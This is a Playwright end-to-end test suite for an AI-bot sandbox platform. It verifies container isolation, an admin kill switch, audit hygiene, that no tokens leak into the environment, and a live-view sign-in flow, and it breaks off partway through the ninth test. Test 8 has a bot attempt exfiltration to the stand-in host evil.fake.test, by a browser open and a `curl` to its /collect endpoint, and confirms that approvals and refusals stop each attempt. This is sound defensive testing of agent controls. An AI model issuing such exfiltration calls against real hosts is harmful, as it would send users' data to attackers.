import { execFileSync } from "node:child_process";
import { randomBytes } from "node:crypto";
import { existsSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { type APIRequestContext, expect, test } from "@playwright/test";
import { BROWSER_TOOL_NAMES, SANDBOX_TOOL_NAMES } from "../../packages/contracts/src/bot-capabilities";
import { apiAs, BASE_URL, ensureMember, SAM } from "../support/actors";
import {
  enableBotSandbox,
  enableSandboxOrg,
  fakeSiteStats,
  killSwitch,
  organizationOf,
  resume,
  useFakeSites,
} from "../support/sandbox";
import { asSuperuser } from "../support/superuser";
import { ADMIN, API_URL } from "../tests/env";

/**
 * Phase 07.8 tracer, end to end (07.8-08 Task 1; D-01, D-02, D-09, SBX-01, SBX-02): a REAL OpenClaw cell (started by
 * scripts/sandbox-proof.sh next to the isolated stack), the REAL API and the REAL sandboxd broker with real hardened
 * `sbx` containers (`scripts/e2e-isolated.sh --sandbox`). The model is the deterministic fake (`[[call …]]`
 * directives); everything else is real. API only, no browser page: the chat is driven like the web does it.
 *
 *   1. Scout (Ana's bot) writes `proof-<nonce>` to note.txt in its own sandbox and reads it back; the real cell's
 *      agent entries allow the confined tools of each bot's switches (`alsoAllow`, from `GET /cell`) while the turn
 *      offers only what the API decides (no browser tool before 07.8-14);
 *   2. Echo (Sam's bot) cannot see that file; the two `sbx` containers sit on different networks and volumes;
 *   3. a running command is stopped by the admin's kill switch within 5 s; a turn delivered before the kill whose
 *      exec reaches the API after it answers the killed sentence; a turn after the kill is offered no sandbox tool;
 *   4. `sandbox.exec` / `sandbox.killed` audit rows carry ids, codes and durations only;
 *   5. after the resume, `env` in the sandbox holds neither the cell token, nor the sandbox token, nor any `OCW_` name.
 *
 * Ana is the e2e admin (tests/env.ts ADMIN). Database reads are read-only; the one write is the organization switch
 * (support/sandbox.ts) until 07.8-11's settings route exists.
 */

test.describe.configure({ mode: "serial" });

/** A cold `sbx` start, a real cell and the 25 s exec yield: generous. */
const REAL = 180_000;
const NS = process.env.OCW_E2E_SANDBOX_NAMESPACE ?? "ocw-e2e";
const NONCE = randomBytes(5).toString("hex");
const MARK = `proof-${NONCE}`;
const KILLED_SENTENCE = "An admin stopped all sandboxes"; // sandbox-tools.ts SANDBOX_REFUSAL_SENTENCE.killed
const KILL_BUDGET_MS = 5_000;

const state = {
  org: "",
  anaId: "",
  samId: "",
  scoutId: "",
  scoutDm: "",
  echoId: "",
  echoDm: "",
  coldStartMs: 0,
  /** Asks until the switch change reached the cell's agent entry (1 = the first message already had the tool). */
  firstExecAttempts: 0,
  killLatencyMs: 0,
  /** The steps that passed, read by scripts/sandbox-proof.sh for its PASS lines. */
  passed: [] as number[],
};

function passed(step: number) {
  state.passed.push(step);
  record();
}

function record() {
  const file = process.env.OCW_PROOF_STATE;
  if (file) writeFileSync(file, JSON.stringify({ ...state, nonce: NONCE, journey }, null, 2));
}

// ---------------------------------------------------------------- docker (read-only inspection of the e2e namespace)

function docker(...args: string[]): string {
  return execFileSync("docker", args, { encoding: "utf8" }).trim();
}

type Inspect = {
  Name: string;
  State: { Running: boolean };
  Config: { Labels: Record<string, string>; Env: string[] | null };
  NetworkSettings: { Networks: Record<string, unknown> };
  Mounts: Array<{ Type: string; Name?: string; Destination: string }>;
};

function sbxOf(agentId: string): Inspect {
  const ids = docker(
    "ps",
    "-aq",
    "--filter",
    `label=ocw.namespace=${NS}`,
    "--filter",
    "label=ocw.kind=sbx",
    "--filter",
    `label=ocw.agent=${agentId}`,
  )
    .split("\n")
    .filter(Boolean);
  expect(ids, `one sbx container for ${agentId}`).toHaveLength(1);
  return (JSON.parse(docker("inspect", ids[0] ?? "")) as Inspect[])[0] as Inspect;
}

/** The real cell's live OpenClaw config: the `alsoAllow` of one bot's agent entry (`ocw-<agent id>`). */
function cellAlsoAllow(agentId: string): string[] {
  const cell = process.env.OCW_PROOF_CELL ?? "";
  expect(cell, "OCW_PROOF_CELL names the cell container (scripts/sandbox-proof.sh)").not.toBe("");
  const config = JSON.parse(docker("exec", cell, "cat", "/home/node/.openclaw/openclaw.json")) as {
    agents?: { entries?: Record<string, { tools?: { alsoAllow?: string[] } }> };
  };
  const id = `ocw-${agentId}`.toLowerCase().replace(/[^a-z0-9_-]/gu, "-"); // openClawAgentIdFor
  return config.agents?.entries?.[id]?.tools?.alsoAllow ?? [];
}

const confinedOf = (tools: string[]) =>
  tools.filter((t) => t.startsWith("ocw_sandbox_") || t.startsWith("ocw_browser_")).sort();

const runningOfOrg = () =>
  docker("ps", "-q", "--filter", `label=ocw.org=${state.org}`).split("\n").filter(Boolean);

// ---------------------------------------------------------------- chat through the API

type Message = {
  id: string;
  seq: number;
  authorKind: string;
  authorId: string | null;
  body: string;
  card?: unknown;
};

async function post(api: APIRequestContext, dm: string, text: string): Promise<Message> {
  const res = await api.post(`/api/v1/conversations/${dm}/messages`, { data: { body: text } });
  expect(res.ok(), `post in ${dm}: ${res.status()}`).toBe(true);
  return (await res.json()) as Message;
}

/**
 * The first bot message after `asked` (the reply to it); a platform card the bot's call posted is not its reply, and
 * with `mentioning`, a reply to another turn (a card-action turn arriving late) is skipped.
 */
async function replyTo(
  api: APIRequestContext,
  dm: string,
  asked: Message,
  timeout = REAL,
  mentioning?: string,
): Promise<string> {
  let reply = "";
  await expect
    .poll(
      async () => {
        const res = await api.get(`/api/v1/conversations/${dm}/messages?after=${asked.seq}&limit=50`);
        if (!res.ok()) return "";
        const page = (await res.json()) as { messages: Message[] };
        reply =
          page.messages.find(
            (m) => m.authorKind === "agent" && !m.card && (!mentioning || m.body.includes(mentioning)),
          )?.body ?? "";
        return reply;
      },
      { timeout, intervals: [500, 1000] },
    )
    .not.toBe("");
  return reply;
}

/**
 * Asks the bot and returns its reply. The bot's cell entry (`alsoAllow`) follows a switch change asynchronously
 * (`cell.config.changed` → `GET /cell` → reconcile), so a reply saying the tool is "not offered" right after a switch
 * change is asked again for up to 90 s; any other reply is final.
 */
async function ask(api: APIRequestContext, dm: string, text: string, tool = "ocw_sandbox_exec") {
  const deadline = Date.now() + 90_000;
  for (let attempt = 1; ; attempt++) {
    const started = Date.now();
    const asked = await post(api, dm, text);
    const reply = await replyTo(api, dm, asked, REAL, `Tool ${tool}`);
    if (!reply.includes(`Tool ${tool} not offered`) || Date.now() > deadline) {
      console.log(`[proof] reply (${Date.now() - started} ms, attempt ${attempt}): ${reply}`);
      return { reply, ms: Date.now() - started, asked, attempts: attempt };
    }
    await new Promise((r) => setTimeout(r, 3_000));
  }
}

const exec = (argv: string[]) => `[[call ocw_sandbox_exec ${JSON.stringify({ argv })}]]`;

async function mentionDelivered(messageId: string): Promise<{ tools: string[] } | null> {
  const { rows } = await asSuperuser<{ payload: { turn?: { tools?: string[] } } }>(
    `select payload from app.stream_events where type = 'agent.mention.v1' and payload->'message'->>'id' = $1`,
    [messageId],
  );
  return rows[0] ? { tools: rows[0].payload.turn?.tools ?? [] } : null;
}

async function freshPersonalBot(api: APIRequestContext, ownerId: string, name: string) {
  const listed = (await (await api.get("/api/v1/agents")).json()) as {
    agents: Array<{ id: string; scope: string; ownerUserId: string | null }>;
  };
  for (const a of listed.agents.filter((x) => x.scope === "personal" && x.ownerUserId === ownerId)) {
    expect((await api.delete(`/api/v1/agents/${a.id}`)).ok()).toBe(true);
  }
  const res = await api.post("/api/v1/agents/personal", {
    data: { name, instructions: "Answer briefly.", modelProvider: "mock", modelId: "mock-1" },
  });
  expect(res.ok(), `create ${name}`).toBe(true);
  const body = (await res.json()) as { agent: { id: string }; dmId: string };
  return { id: body.agent.id, dm: body.dmId };
}

async function waitReady(api: APIRequestContext, id: string) {
  await expect
    .poll(
      async () => {
        const listed = (await (await api.get("/api/v1/agents")).json()) as {
          agents: Array<{ id: string; status: string }>;
        };
        return listed.agents.find((a) => a.id === id)?.status;
      },
      { timeout: 120_000 },
    )
    .toBe("ready");
}

// ---------------------------------------------------------------- the proof

test("1. two bots, both switches on; Scout writes and reads its own file in its sandbox", async () => {
  test.setTimeout(2 * REAL);
  const ana = await apiAs(ADMIN);
  state.org = await organizationOf(ana);
  state.anaId = ((await (await ana.get("/api/v1/me")).json()) as { user: { id: string } }).user.id;
  state.samId = await ensureMember(ana, SAM, "developer");
  const sam = await apiAs(SAM);

  // One cell change at a time, each awaited in the cell: the steps stay deterministic. (This proof found that the plugin
  // folded a `cell.config.changed` arriving during an in-flight refresh into it, so a bot created then stayed
  // `provisioning`; bridge.ts `refreshCell` now runs one more refresh after the flight.)
  const scout = await freshPersonalBot(ana, state.anaId, "Scout");
  await waitReady(ana, scout.id);
  const echo = await freshPersonalBot(sam, state.samId, "Echo");
  await waitReady(sam, echo.id);
  Object.assign(state, { scoutId: scout.id, scoutDm: scout.dm, echoId: echo.id, echoDm: echo.dm });

  await enableSandboxOrg(ana);
  expect(await enableBotSandbox(ana, scout.id, { sandbox: true, browser: true })).toEqual({
    sandbox: true,
    browser: true,
  });
  // WINDOWS #240: the real cell's agent entries allow the confined tools (OpenClaw runs only what `alsoAllow` lists).
  await expect
    .poll(() => confinedOf(cellAlsoAllow(scout.id)), { timeout: 60_000 })
    .toEqual([...SANDBOX_TOOL_NAMES, ...BROWSER_TOOL_NAMES].sort());
  expect(await enableBotSandbox(sam, echo.id)).toEqual({ sandbox: true, browser: false });
  await expect
    .poll(() => confinedOf(cellAlsoAllow(echo.id)), { timeout: 60_000 })
    .toEqual([...SANDBOX_TOOL_NAMES].sort());
  record();
  console.log(
    `[proof] cell alsoAllow: Scout ${confinedOf(cellAlsoAllow(scout.id)).length} confined tools, Echo ${confinedOf(cellAlsoAllow(echo.id)).length}`,
  );

  const { reply, ms, attempts } = await ask(
    ana,
    scout.dm,
    `write it ${exec(["sh", "-c", `echo ${MARK} > note.txt && cat note.txt`])}`,
  );
  expect(reply).toContain("Tool ocw_sandbox_exec said: exit 0");
  expect(reply).toContain(MARK);
  // Since 07.8-14 the API offers the browser tools to a bot whose Browser switch is on (both are on here); the first
  // CI run of this proof (07.8-24) found the old "no browser tool yet" expectation stale.
  expect(reply).toContain("ocw_browser_open");
  state.coldStartMs = ms;
  state.firstExecAttempts = attempts;
  await ana.dispose();
  await sam.dispose();
  passed(1);
});

test("2. Echo cannot see Scout's file; the two sandboxes have their own network and volume", async () => {
  test.setTimeout(REAL);
  const sam = await apiAs(SAM);
  const { reply } = await ask(sam, state.echoDm, `read it ${exec(["cat", "note.txt"])}`);
  expect(reply).toContain("No such file");
  expect(reply).not.toContain(MARK);
  await sam.dispose();

  const a = sbxOf(state.scoutId);
  const b = sbxOf(state.echoId);
  const netsA = Object.keys(a.NetworkSettings.Networks);
  const netsB = Object.keys(b.NetworkSettings.Networks);
  const volsA = a.Mounts.filter((m) => m.Type === "volume").map((m) => m.Name ?? "");
  const volsB = b.Mounts.filter((m) => m.Type === "volume").map((m) => m.Name ?? "");
  console.log(
    `[proof] Scout sbx ${a.Name} nets=${netsA} vols=${volsA}; Echo sbx ${b.Name} nets=${netsB} vols=${volsB}`,
  );
  expect(netsA).toHaveLength(1);
  expect(netsB).toHaveLength(1);
  expect(netsA[0]).toMatch(/^ocw-net-/);
  expect(netsB[0]).toMatch(/^ocw-net-/);
  expect(netsA[0]).not.toBe(netsB[0]);
  expect(volsA.some((v) => v.startsWith("ocw-ws-"))).toBe(true);
  expect(volsB.some((v) => v.startsWith("ocw-ws-"))).toBe(true);
  expect(volsA.filter((v) => volsB.includes(v))).toEqual([]);
  for (const [c, agent] of [
    [a, state.scoutId],
    [b, state.echoId],
  ] as const) {
    expect(c.Config.Labels).toMatchObject({ "ocw.namespace": NS, "ocw.org": state.org, "ocw.agent": agent });
  }
  passed(2);
});

test("3. the kill switch stops a running command within 5 s; the next exec answers the killed sentence", async () => {
  test.setTimeout(2 * REAL);
  const ana = await apiAs(ADMIN);

  // A long command: the exec yields after 25 s with a process id while it keeps running.
  const long = await ask(ana, state.scoutDm, `wait ${exec(["sleep", "120"])}`);
  expect(long.reply).toMatch(/still running as process [A-Za-z0-9_-]+/);
  expect(runningOfOrg().length).toBeGreaterThan(0);

  // A turn delivered BEFORE the kill whose model thinks 8 s before calling exec, so the call reaches the API after it.
  const late = await post(ana, state.scoutDm, `after the kill [[pause:8]] ${exec(["echo", "after-kill"])}`);
  await expect
    .poll(async () => (await mentionDelivered(late.id))?.tools ?? null, { timeout: 30_000 })
    .toContain("ocw_sandbox_exec");

  const started = Date.now();
  const killed = await killSwitch(ana);
  expect(killed.killed).toMatchObject({ by: { id: state.anaId } });
  await expect.poll(() => runningOfOrg().length, { timeout: KILL_BUDGET_MS, intervals: [100] }).toBe(0);
  state.killLatencyMs = Date.now() - started;
  console.log(
    `[proof] kill switch: no running container of the organization after ${state.killLatencyMs} ms`,
  );
  expect(state.killLatencyMs).toBeLessThanOrEqual(KILL_BUDGET_MS);
  record();

  const lateReply = await replyTo(ana, state.scoutDm, late);
  console.log(`[proof] late exec reply: ${lateReply}`);
  expect(lateReply).toContain(`Tool ocw_sandbox_exec said: ${KILLED_SENTENCE}`);
  expect(lateReply).not.toContain("after-kill");

  // A turn delivered after the kill is not even offered the tool (the offering refuses too).
  const after = await post(ana, state.scoutDm, `again ${exec(["echo", "again"])}`);
  const afterReply = await replyTo(ana, state.scoutDm, after);
  console.log(`[proof] after-kill reply: ${afterReply}`);
  expect(afterReply).toContain("Tool ocw_sandbox_exec not offered");
  expect(runningOfOrg()).toEqual([]);
  await ana.dispose();
  passed(3);
});

test("4. sandbox.exec and sandbox.killed are audited with ids, codes and durations only", async () => {
  const { rows } = await asSuperuser<{
    action: string;
    actor_kind: string;
    actor_id: string | null;
    agent_id: string | null;
    result: string;
    metadata: Record<string, unknown>;
  }>(
    `select action, actor_kind, actor_id, agent_id, result, metadata from app.audit_events
      where organization_id = $1 and action in ('sandbox.exec', 'sandbox.killed') order by occurred_at, id`,
    [state.org],
  );
  for (const r of rows)
    console.log(`[proof] audit ${r.action} ${r.actor_kind} ${r.result} ${JSON.stringify(r.metadata)}`);
  const execs = rows.filter((r) => r.action === "sandbox.exec");
  expect(execs.some((r) => r.agent_id === state.scoutId)).toBe(true);
  expect(execs.some((r) => r.agent_id === state.echoId)).toBe(true);
  const allowed = new Set(["eventId", "status", "exitCode", "durationMs", "reason"]);
  for (const r of execs) {
    expect(
      Object.keys(r.metadata).filter((k) => !allowed.has(k)),
      JSON.stringify(r.metadata),
    ).toEqual([]);
  }
  const killedRows = rows.filter((r) => r.action === "sandbox.killed");
  expect(killedRows).toHaveLength(1);
  expect(killedRows[0]).toMatchObject({ actor_kind: "user", actor_id: state.anaId });

  // No argv, path or output anywhere in this organization's audit trail or tool ledger.
  for (const needle of [MARK, "note.txt", "after-kill"]) {
    const audit = await asSuperuser<{ n: number }>(
      "select count(*)::int as n from app.audit_events where organization_id = $1 and metadata::text like $2",
      [state.org, `%${needle}%`],
    );
    expect(audit.rows[0]?.n, `audit rows mentioning ${needle}`).toBe(0);
    const ledger = await asSuperuser<{ n: number }>(
      "select count(*)::int as n from app.agent_tool_calls where organization_id = $1 and row_to_json(agent_tool_calls)::text like $2",
      [state.org, `%${needle}%`],
    );
    expect(ledger.rows[0]?.n, `ledger rows mentioning ${needle}`).toBe(0);
  }
  passed(4);
});

test("5. after the resume, the sandbox environment holds no token and no OCW_ name", async () => {
  test.setTimeout(REAL);
  const ana = await apiAs(ADMIN);
  const resumed = await resume(ana);
  expect(resumed.killed).toBeNull();
  const { reply } = await ask(ana, state.scoutDm, `env please ${exec(["env"])}`);
  expect(reply).toContain("Tool ocw_sandbox_exec said: exit 0");
  expect(reply).toContain("HOME=/workspace");
  await ana.dispose();

  const secrets = [process.env.OCW_CELL_TOKEN ?? "", process.env.OCW_SANDBOX_TOKEN ?? ""].filter(
    (s) => s.length >= 16,
  );
  expect(secrets, "both tokens are known to the proof").toHaveLength(2);
  const clean = (text: string, where: string) => {
    for (const s of secrets) expect(text.includes(s), `a token in ${where}`).toBe(false);
    expect(text, where).not.toContain("OCW_");
  };
  clean(reply, "the reply");

  // The whole `env` output as the model received it (the fake model's request capture, not the 200-character preview).
  const dir = process.env.OCW_PROOF_CAPTURE_DIR ?? "";
  expect(existsSync(dir), "the model capture directory").toBe(true);
  const results = readdirSync(dir)
    .filter((f) => f.endsWith("-openai.json"))
    .flatMap((f) => {
      const body = JSON.parse(readFileSync(join(dir, f), "utf8")) as {
        messages?: Array<{ role: string; content: unknown }>;
      };
      return (body.messages ?? [])
        .filter((m) => m.role === "tool")
        .map((m) => (typeof m.content === "string" ? m.content : JSON.stringify(m.content)));
    })
    .filter((t) => t.includes("HOME=/workspace"));
  expect(results.length, "the env tool result reached the model").toBeGreaterThan(0);
  for (const t of results) clean(t, "the env tool result");

  // And the container's own environment (what every exec inherits).
  const env = sbxOf(state.scoutId).Config.Env ?? [];
  clean(env.join("\n"), "the sbx container environment");
  passed(5);
});

// ================================================================ 07.8-28: the sign-in journey with real Chromium

/**
 * Steps 6-10 (07.8-28 Task 2; D-05, D-06, D-07, D-08, D-11 F-5, D-12 U-2, D-13; BRW-02…04; P-10, P-18): the real cell,
 * the real API, the real sandboxd, the real `brw` (Chromium) and the fake sites `scripts/e2e-isolated.sh --sandbox`
 * started. A team bot (Guide) owned by Ana, Sam's DM with it: the bot opens the site and asks Sam to sign in; Sam takes
 * control over the real live-view socket and types the four E1 strings; Ana (the bot's owner) and Sam's second device
 * receive no frame while he controls the page or while his session is loaded; the bot continues signed in; three ways to
 * carry what it saw to evil.fake.test each stop (the fake site's /collect stays 0); none of the four strings is in any
 * store or log; the session is reused, revoked, and never another member's.
 *
 * Guide is a TEAM bot so that someone other than Sam (its owner) can watch the page (U-2 needs a second person): its
 * shell after the sign-in is therefore refused `member_data` (P-11), stricter than the personal-bot approval
 * (leak-sweep.int proves that path at API level).
 */

const PANEL = "panel.fake.test:8080";
const EVIL = "evil.fake.test:8080";
const E1 = {
  username: "ana@example.test",
  password: "S3cr3t-Hunter2-OCW",
  otp: "735190",
  revealed: "Visible-Secret-99",
};
/** Fixed CSS boxes of the fake sign-in page (infra/sandbox/test/fake-site.mjs LOGIN_LAYOUT). */
const LOGIN = {
  email: { x: 200, y: 138 },
  password: { x: 170, y: 198 },
  toggle: { x: 370, y: 198 },
  otp: { x: 120, y: 258 },
  submit: { x: 100, y: 320 },
};
const APPROVAL_SENTENCE = "This action needs approval.";
const MEMBER_DATA_SENTENCE = "so I can't change my sandbox or run commands";

const journey = {
  guideId: "",
  dm: "",
  anaDm: "",
  contextId: "",
  sessionId: "",
  takeAt: 0,
  /** When Sam's signed-in page ended (the revoke): frames to others are allowed again after it. */
  privateUntil: 0,
  anaFrames: [] as number[],
  otherDeviceFrames: [] as number[],
  controllerFrames: 0,
  pendingApprovals: 0,
  collectHits: -1,
  signInMs: 0,
};

interface Live {
  ws: WebSocket;
  json: Array<Record<string, unknown>>;
  frames: number[];
  send(frame: unknown): void;
  state(): string | undefined;
  close(): void;
}

/** A live-view socket as the web opens it: the web origin and the `ocw.auth.<jwt>` subprotocol of `api`'s member. */
async function liveSocket(api: APIRequestContext, contextId: string): Promise<Live> {
  const res = await api.get("/api/auth/token");
  expect(res.ok(), "GET /api/auth/token").toBe(true);
  const { token } = (await res.json()) as { token: string };
  const url = `${API_URL.replace(/^http/u, "ws")}/api/v1/live/browser/${contextId}`;
  // Node's WebSocket (undici) takes the handshake headers in its init: the live view checks the Origin.
  const ws = new WebSocket(url, {
    protocols: ["ocw.v1", `ocw.auth.${token}`],
    headers: { origin: BASE_URL },
  } as unknown as string[]);
  ws.binaryType = "arraybuffer";
  const json: Array<Record<string, unknown>> = [];
  const frames: number[] = [];
  ws.onmessage = (ev) => {
    if (typeof ev.data === "string") json.push(JSON.parse(ev.data) as Record<string, unknown>);
    else frames.push(Date.now());
  };
  await new Promise<void>((resolve, reject) => {
    ws.onopen = () => resolve();
    ws.onerror = () => reject(new Error(`live view ${contextId}: the socket did not open`));
  });
  return {
    ws,
    json,
    frames,
    send: (frame) => ws.send(JSON.stringify(frame)),
    state: () => [...json].reverse().find((f) => f.type === "state")?.state as string | undefined,
    close: () => ws.close(),
  };
}

async function waitState(l: Live, state: string, timeout = 20_000) {
  await expect.poll(() => l.state(), { timeout, message: `live view state ${state}` }).toBe(state);
}

const clickAt = (p: { x: number; y: number }) => [
  { type: "mouse", event: "move", x: p.x, y: p.y, button: "none" },
  { type: "mouse", event: "down", x: p.x, y: p.y, button: "left" },
  { type: "mouse", event: "up", x: p.x, y: p.y, button: "left" },
];
const PUNCT: Record<string, string> = {
  "@": "Digit2",
  "-": "Minus",
  ".": "Period",
  _: "Minus",
  " ": "Space",
};
const keyFrames = (s: string) =>
  [...s].flatMap((ch) => {
    const code = /[a-z]/iu.test(ch)
      ? `Key${ch.toUpperCase()}`
      : /[0-9]/u.test(ch)
        ? `Digit${ch}`
        : (PUNCT[ch] ?? "Unidentified");
    const modifiers = /[A-Z@_]/u.test(ch) ? 8 : 0;
    return [
      { type: "key", event: "down", key: ch, code, modifiers },
      { type: "key", event: "up", key: ch, code, modifiers },
    ];
  });

/** Sends frames one by one with a short gap (a person's input, never a burst the page could drop). */
async function typeInto(l: Live, frames: unknown[]) {
  for (const f of frames) {
    l.send(f);
    await new Promise((r) => setTimeout(r, 15));
  }
}

const call = (tool: string, args: Record<string, unknown>) => `[[call ${tool} ${JSON.stringify(args)}]]`;

/** Every tool result the model received in the run (the fake model's request captures). */
function toolResults(): string[] {
  const dir = process.env.OCW_PROOF_CAPTURE_DIR ?? "";
  return readdirSync(dir)
    .filter((f) => f.endsWith("-openai.json"))
    .flatMap((f) => {
      const body = JSON.parse(readFileSync(join(dir, f), "utf8")) as {
        messages?: Array<{ role: string; content: unknown }>;
      };
      return (body.messages ?? [])
        .filter((m) => m.role === "tool")
        .map((m) => (typeof m.content === "string" ? m.content : JSON.stringify(m.content)));
    });
}

test("6. Sam signs in for Guide by typing in the real page through the live view; nobody else sees a frame", async () => {
  test.setTimeout(4 * REAL);
  const ana = await apiAs(ADMIN);
  const sam = await apiAs(SAM);
  // The fake sites are reachable private hosts; the shell may reach evil.fake.test (so only D-13 can stop it there).
  await useFakeSites(ana, { sandboxEgress: "allowlist", allowHosts: [EVIL] });

  const created = await ana.post("/api/v1/agents", {
    data: {
      name: `Guide ${NONCE.slice(0, 4)}`,
      username: `guide${NONCE.slice(0, 6)}`,
      instructions: "Answer briefly.",
      modelProvider: "mock",
      modelId: "mock-1",
      ownerUserId: state.anaId,
    },
  });
  expect(created.ok(), `create Guide: ${created.status()}`).toBe(true);
  journey.guideId = ((await created.json()) as { id: string }).id;
  await waitReady(ana, journey.guideId);
  expect(await enableBotSandbox(ana, journey.guideId, { sandbox: true, browser: true })).toEqual({
    sandbox: true,
    browser: true,
  });
  await expect
    .poll(() => confinedOf(cellAlsoAllow(journey.guideId)), { timeout: 60_000 })
    .toEqual([...SANDBOX_TOOL_NAMES, ...BROWSER_TOOL_NAMES].sort());
  const dm = await sam.post(`/api/v1/agents/${journey.guideId}/dm`);
  expect(dm.ok(), "Sam's DM with Guide").toBe(true);
  journey.dm = ((await dm.json()) as { dmId: string }).dmId;

  const opened = await ask(
    sam,
    journey.dm,
    `look ${call("ocw_browser_open", { url: `http://${PANEL}/app` })} ${call("ocw_browser_snapshot", {})}`,
    "ocw_browser_open",
  );
  expect(opened.reply).toContain(`Tool ocw_browser_open said: Opened ${PANEL}`);
  expect(opened.reply).toContain("Sign in");
  const asked = await ask(
    sam,
    journey.dm,
    `sign me in ${call("ocw_browser_signin", { reason: "I need the orders dashboard" })}`,
    "ocw_browser_signin",
  );
  expect(asked.reply).toContain("Tool ocw_browser_signin said:");
  const { rows } = await asSuperuser<{ context_id: string; status: string; card_message_id: string }>(
    "select context_id, status, card_message_id from app.browser_signin_requests where agent_id = $1 order by created_at desc limit 1",
    [journey.guideId],
  );
  expect(rows[0]?.status).toBe("waiting");
  expect(rows[0]?.card_message_id).toBeTruthy();
  journey.contextId = rows[0]?.context_id as string;

  // Ana watches as Guide's owner: the page is live for her before Sam takes it.
  const anaLive = await liveSocket(ana, journey.contextId);
  const controller = await liveSocket(sam, journey.contextId);
  const otherDevice = await liveSocket(sam, journey.contextId);
  try {
    await expect.poll(() => anaLive.frames.length, { timeout: 20_000 }).toBeGreaterThan(0);
    controller.send({ type: "take" });
    await waitState(controller, "controlling");
    journey.takeAt = Date.now();
    await waitState(anaLive, "private");
    await waitState(otherDevice, "private");
    const started = Date.now();

    // On /app: Tab to "Sign in with a password", Enter; then the sign-in form by its fixed boxes.
    await typeInto(controller, [
      { type: "key", event: "down", key: "Tab", code: "Tab", modifiers: 0 },
      { type: "key", event: "up", key: "Tab", code: "Tab", modifiers: 0 },
      { type: "key", event: "down", key: "Enter", code: "Enter", modifiers: 0 },
      { type: "key", event: "up", key: "Enter", code: "Enter", modifiers: 0 },
    ]);
    await new Promise((r) => setTimeout(r, 2_000));
    await typeInto(controller, [...clickAt(LOGIN.email), ...keyFrames(E1.username)]);
    await typeInto(controller, [...clickAt(LOGIN.password), ...keyFrames(E1.password)]);
    await typeInto(controller, [...clickAt(LOGIN.otp), { type: "text", text: E1.otp }]);
    // The show-password toggle, then more typed into the now visible field.
    await typeInto(controller, [
      ...clickAt(LOGIN.toggle),
      ...clickAt(LOGIN.password),
      { type: "text", text: E1.revealed },
    ]);
    const loginsBefore = fakeSiteStats().logins ?? 0;
    await typeInto(controller, clickAt(LOGIN.submit));
    await expect.poll(() => fakeSiteStats().logins ?? 0, { timeout: 20_000 }).toBeGreaterThan(loginsBefore);
    journey.controllerFrames = controller.frames.length;
    expect(journey.controllerFrames, "the controller sees the page").toBeGreaterThan(0);

    controller.send({ type: "release" });
    await expect
      .poll(
        async () =>
          (
            await asSuperuser<{ status: string; session_id: string | null }>(
              "select status, session_id from app.browser_signin_requests where context_id = $1",
              [journey.contextId],
            )
          ).rows[0]?.status,
        { timeout: 30_000 },
      )
      .toBe("signed_in");
    journey.signInMs = Date.now() - started;
    const sealed = await asSuperuser<{ session_id: string }>(
      "select session_id from app.browser_signin_requests where context_id = $1",
      [journey.contextId],
    );
    journey.sessionId = sealed.rows[0]?.session_id as string;
    // With Sam's session loaded on the page, Ana still sees it private (U-2).
    await waitState(anaLive, "private");
    // Hold the sockets open through the signed-in steps: frames to Ana are counted until the page ends.
  } finally {
    journey.otherDeviceFrames = otherDevice.frames.filter((t) => t >= journey.takeAt);
    otherDevice.close();
    controller.close();
    liveSockets.ana = anaLive;
  }
  await ana.dispose();
  await sam.dispose();
  record();
  passed(6);
});

const liveSockets: { ana: Live | null } = { ana: null };

test("7. the bot continues signed in: a snapshot reads the dashboard", async () => {
  test.setTimeout(REAL);
  const sam = await apiAs(SAM);
  const { reply } = await ask(
    sam,
    journey.dm,
    `and now ${call("ocw_browser_snapshot", {})}`,
    "ocw_browser_snapshot",
  );
  expect(reply).toContain("Signed in");
  // The reply quotes 200 characters of the result; the whole snapshot the model read has the dashboard.
  expect(toolResults().some((t) => t.includes("Signed in") && t.includes("Welcome"))).toBe(true);
  await sam.dispose();
  passed(7);
});

test("8. D-13: an open of evil.fake.test, a click on the Export link and a curl there each stop; /collect stays 0", async () => {
  test.setTimeout(2 * REAL);
  const sam = await apiAs(SAM);
  const collectBefore = fakeSiteStats().collect ?? 0;
  const { reply, asked } = await ask(
    sam,
    journey.dm,
    `send it ${call("ocw_browser_open", { url: `http://${EVIL}/collect?d=proof` })} ${call(
      "ocw_browser_open",
      {
        url: `http://${PANEL}/lock`,
      },
    )} ${call("ocw_browser_snapshot", {})} ${call("ocw_browser_act", { action: "click", ref: "{{ref:Export}}" })} ${call(
      "ocw_sandbox_exec",
      { argv: ["curl", "-s", `http://${EVIL}/collect?d=proof`] },
    )}`,
    "ocw_browser_open",
  );
  const lines = reply.split("\n");
  console.log(`[proof] D-13 reply:\n${reply}`);
  expect(lines[0]).toContain(`Tool ocw_browser_open said: ${APPROVAL_SENTENCE}`);
  expect(lines[1]).toContain(`Tool ocw_browser_open said: Opened ${PANEL}`);
  expect(toolResults().some((t) => t.includes('link "Export"'))).toBe(true);
  // The click names the Export link's ref from that snapshot (`{{ref:Export}}`); a signed-in click waits for Sam.
  expect(lines[3]).toContain(`Tool ocw_browser_act said: ${APPROVAL_SENTENCE}`);
  expect(lines[4]).toContain(MEMBER_DATA_SENTENCE);
  journey.collectHits = (fakeSiteStats().collect ?? 0) - collectBefore;
  expect(journey.collectHits).toBe(0);
  const event = await asSuperuser<{ event_id: string }>(
    "select payload->>'eventId' as event_id from app.stream_events where type = 'agent.mention.v1' and payload->'message'->>'id' = $1",
    [asked.id],
  );
  const pending = await asSuperuser<{ tool: string; requested_for_user_id: string; ttl_s: number }>(
    `select t.tool, t.requested_for_user_id, extract(epoch from r.expires_at - r.created_at)::int as ttl_s
       from app.tool_call_approvals t join app.approval_requests r on r.resource_id = t.id
      where t.event_id = $1 and r.status = 'pending' order by r.created_at`,
    [event.rows[0]?.event_id],
  );
  console.log(`[proof] pending approvals: ${JSON.stringify(pending.rows)}`);
  expect(pending.rows.map((r) => r.tool)).toEqual(["ocw_browser_open", "ocw_browser_act"]);
  for (const r of pending.rows) {
    expect(r.requested_for_user_id).toBe(state.samId);
    expect(r.ttl_s).toBeLessThanOrEqual(15 * 60 + 1);
  }
  journey.pendingApprovals = pending.rows.length;
  await sam.dispose();
  record();
  passed(8);
});

test("9. reuse, revoke, never another member's; frames reach others again once the signed-in page ended", async () => {
  test.setTimeout(2 * REAL);
  const ana = await apiAs(ADMIN);
  const sam = await apiAs(SAM);
  // A new turn on the same site is signed in without a card.
  const again = await ask(
    sam,
    journey.dm,
    `again ${call("ocw_browser_open", { url: `http://${PANEL}/app` })}`,
    "ocw_browser_open",
  );
